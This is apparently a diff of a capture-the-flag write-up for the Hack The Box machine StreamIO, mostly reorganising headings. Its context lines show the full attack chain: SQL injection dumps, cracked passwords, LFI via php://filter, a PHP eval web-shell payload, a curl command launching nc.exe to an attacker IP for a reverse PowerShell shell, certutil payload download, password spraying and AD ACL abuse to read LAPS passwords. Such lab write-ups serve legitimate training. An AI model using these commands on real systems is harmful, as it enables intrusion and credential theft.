@@ -11,7 +11,9 @@ tags:
   - DomainObjectAcl
 ---
 
-## NMAP
+
+## Enumeration
+### NMAP
 ```bash
 nmap -sC -sV -v -T4 -oN scans/nmap.txt streamio.htb
 ```
@@ -37,7 +39,7 @@ Nmap scan contains the `watch` subdomain. We'll add this to our `/etc/hosts
  
 ![](./20220712144826.png)  
 
-## Website
+### Website
 
 `https://streamio.htb` is what looks to be an online streaming site.
 
@@ -53,7 +55,7 @@ There's a `/login.php` page.
 
 Let's head back to the login form. Let's use Burp to throw some payloads at it to see if it's vulnerable.
 
-## SQLi
+### SQLi
 
 To test for SQLi i'm using a time delay. Note that this is a Windows machine so it's most likely using a `MSSQL` database so it will require the correct syntax.
 
@@ -91,7 +93,7 @@ sqlmap -r login.req --force-ssl --level 3 -D STREAMIO -T users --dump --batch
 
 Now that we have a list of all the users and password hashes, let's crack them and try them against the login form. I did notice that there are two user's who don't seem to fit in with the rest of the usernames: `admin` and `yoshihide`.
 
-## Cracking Hashes
+### Cracking Hashes
 
 We can use `name-that-hash` to determine the type of hash, although we can probably guess it's `MD5`.
 
@@ -140,7 +142,7 @@ b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 ```
 
-## Directory Fuzzing
+### Directory Fuzzing
 
 I tried `yoshihide:66boysandgirls..` and was able to login. We don't seem to be taken to an authenticated page. I'll fuzz some directories using `gobuster`.
 
@@ -152,7 +154,7 @@ We are using `-k` to ignore self-signed SSL certificates.
 
 ![](./20220713114453.png)  
 
-## Admin Page
+### Admin Page
 
 The `/admin` directory stands out most, let's check that out.
 
@@ -162,7 +164,7 @@ I noticed that for each page there is a corresponding query parameter.
 
 ![](./20220713114615.png)  
 
-## Parameter Fuzzing
+### Parameter Fuzzing
 
 I'll try fuzzing to see if there are any other parameters. We are making authenticated requests so let's grab our `PHPSESSID` cookie and add this to our fuzz requests. We'll just use `gobuster` for this.
 
@@ -174,7 +176,7 @@ gobuster fuzz -k -c 'PHPSESSID=rjf0hjub4buau2t69ec0jtl6de' -u https://streamio.h
 
 ![](./20220713123818.png)  
 
-## LFI
+### LFI
 
 We've got a new `debug` parameter. Let's attempt to use LFI against it, and because we're on Windows we can't just use `/etc/passwd` to test, we'll be using:
 
@@ -206,7 +208,7 @@ First thing we notice are database credentials `db_admin:B1@hx31234567890`. Anot
 
 Unfortunately none of these pages include any other page references we can look into. Similar to fuzzing for parameters, we'll do the same thing for files using the `Common-PHP-Filesnames.txt` wordlist for `SecLists`.
 
-## File Fuzzing
+### File Fuzzing
 
 ```bash
 gobuster fuzz -k -c 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' -u https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt | grep -v Length=1712
@@ -216,7 +218,7 @@ This yields us a `master.php` file which we haven't seen yet.
 
 ![](./20220713144933.png)  
 
-## Source Code Analysis
+### Source Code Analysis
 
 If we review the code we see `eval` being used right at the end of the file.
 
@@ -232,7 +234,9 @@ If we review the code we see `eval` being used right at the end of the file.
 ?>
 ```
 
-## Remote Code Execution
+
+## Foothold
+### Remote Code Execution
 
 After analysing this code snippet we can figure out what it's doing. We need to make a `POST` request with a `php` file in the body of the request with the key of `include` which will then be evaluated and executed. We can `base64` encode `system($_GET['cmd'])` as our page payload. Let's use `curl` to make our request.
 
@@ -274,7 +278,7 @@ Execute `nc.exe 10.10.16.6 9001 powershell.exe` payload via curl command.
 curl -sk -X 'POST' -b 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=c:\windows\temp\nc.exe+10.10.16.6+9001+-e+powershell.exe' | grep '<input name="include" hidden>' -A 1000 | grep '</div>' -B 1000 | tail -n +3 | head -n -1
 ```
 
-## Low Privilege Shell
+### Low Privilege Shell
 
 Now we have a shell.
 
@@ -321,7 +325,9 @@ We can execute this shell using `curl`.
 curl -k https://streamio.htb/shell.php
 ```
 
-## Socks Proxy
+
+## Lateral Movement
+### Socks Proxy
 
 If we checkout `Program Files` we see `LAPS` and `Microsoft SQL Server`. Since it looks like the target is running `MSSQL`, let's use [chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.7) to forward port `1433 (MSSQL)`. 
 
@@ -346,7 +352,7 @@ Before continuing we need to make sure `proxychains` is setup correctly. Edit th
 socks5 127.0.0.1 1080
 ```
 
-## Dump Database
+### Dump Database
 
 Now to interface with the `MSSQL` database lets use Impacket's `mssqlclient.py`.
 
@@ -375,7 +381,7 @@ We could use `hashcat` to crack our hash but we can use a free website called [C
 
 ![](./20220714163746.png)  
 
-## Interactive Shell
+### Interactive Shell
 
 Now that we have a legitimate users credentials, let's get a proper shell using `evil-winrm`.
 
@@ -397,7 +403,9 @@ certutil -urlcache -split -f http://10.10.16.10/winpeas.exe winpeas.exe
 .\winpeas.exe
 ```
 
-## Firefox Credentials
+
+## Privilege Escalation
+### Firefox Credentials
 
 One thing in partcular popped out at me. There are `Firefox` credentials.
 
@@ -437,7 +445,7 @@ https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
 
-## Password Spraying
+### Password Spraying
 
 Let's create a username and password list and do some password spraying with the credentials we have so far.
 
@@ -455,7 +463,7 @@ If we text for `winrm` instead we can see that we aren't able to use `JDgodd:JDg
 crackmapexec winrm streamio.htb -u users.txt -p passwords.txt --continue-on-success | grep -i [+]
 ```
 
-## Bloodhound
+### BloodHound
 
 Since we have a user's credentials, we can start off with getting data to load into `Bloodhound` to determine the best path to a more prilvileged user to pivot to.
 
@@ -479,7 +487,7 @@ Let's start off by adding `JDgodd` to the `Core Staff` group. If we right click 
 
 ![](./20220714194114.png)  
 
-## PowerView
+### PowerView
 
 We'll start by uploading [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the target. We can use the SMB share we setup previously.
 
@@ -512,7 +520,7 @@ We can check if this worked by checking the `Core Staff` group's users using `ne
 
 ![](./20220714195427.png)  
 
-## LAPS
+### LAPS
 
 Now we can read the Local Administrator password via LAPS.
 
@@ -522,7 +530,7 @@ Get-DomainObject DC -Credential $Cred -Properties name,"ms-mcs-AdmPwd"
 
 ![](./20220714200515.png)  
 
-## Administrator
+### Administrator
 
 We can now login to the target as an Administrator via `evil-winrm`.
 
